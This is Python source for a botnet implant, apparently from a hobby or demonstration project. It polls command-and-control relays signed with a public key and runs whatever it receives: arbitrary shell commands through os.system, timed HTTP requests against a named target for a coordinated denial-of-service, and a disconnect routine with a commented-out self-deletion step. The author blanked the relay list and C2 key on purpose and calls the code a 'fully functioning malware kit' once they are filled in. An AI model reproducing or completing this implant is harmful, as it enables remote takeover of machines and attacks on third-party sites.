import os, json, time, random, requests
from src.interact_nodes  import pull


# I'm gonnal leave these here hardcoded, and not available, 
# as it's basically a fully functioning malware kit 
# if I make it functional. If you want to play around with it,
# you likely know how to make it run without it being point & click.
RELAYS        : list = [  ]
C2_PUBLIC_KEY : str  = ""
HEARTBEAT     : int  = 5 + random.randint( 1, 9 )


#
#   COMMANDS 
#
def attack( args : str ):
    # "target,timestamp" -> "victim.org,13333337"
    params            = args.split(",")
    target, timestamp = str( params[ 0 ] ), int( params[ 1 ].split(".")[0] ) 
    
    print("pew pew")
    # Wait for the timestamp to pass.
    while time.time() < round(timestamp):
        time.sleep( 1 ); print( f"waiting for { time.time() - round(timestamp) } ..." )
        continue
    
    # booo! scary DoS attack.
    _ = requests.get( f"http://{target}" )
    print(f"http://{target}", _, _.text)


def cli( args ): 
    os.system( args )


def disconnect( _ ):
    # os.system( "rm ./*.py" ); os.system( "rm ./*pycache*" )
    exit()


COMMANDS = {
    "cli"        : cli,
    "attack"     : attack,
    "disconnect" : disconnect, 
}


#
#   Helpers/Implementation
#
def pick_last( messages : list ):
    last_message = messages[ 0 ]
    for message in messages:
        
        last_timestamp    = last_message["created_at"]
        current_timestamp = message[ "created_at" ] 
        
        if last_timestamp <= current_timestamp:
            last_message = message

    return last_message


def execute_command( message : dict ) -> bool:
    raw_msg = message[ "content" ]
    print( raw_msg )
    
    payload = json.loads( raw_msg )
    
    # Check that necessary keys exist
    try:
        command   = payload[ "command" ]
        arguments = payload[ "args" ]
    except KeyError:
        return False
    
        
    # Play the command. On fail to execute, 
    # simply ignore and reset the loop.
    try: 
        COMMANDS[ command ]( arguments )
    except Exception: 
        return False
    
    return True


#
#   Main flow of the implant/bot
#
def main():
    global C2_PUBLIC_KEY, RELAYS
    
    # As it's in RAM, it will replay the last command upon re-entry. 
    messages_seen = {}
    
    while 1:
        # Iterate through the relays. 
        # Upon first successful play of the command,
        # stop and wait for a new one.
        for relay in RELAYS:
            messages =  pull(
                relay      = relay,
                public_key = C2_PUBLIC_KEY, 
            )
            
            # No message received from the relay.
            if messages == []:
                continue
            
            # Do not replay seen messages.
            last_message       = pick_last( messages )
            last_message_hash = hash(str(last_message))
            
            if last_message_hash in messages_seen:
                continue
            
            # Mark message seen and play it. 
            messages_seen[ last_message_hash ] = 1
            execute_command( last_message ) 
            
            break
        
        time.sleep( HEARTBEAT )
        
if __name__ == "__main__":
    main()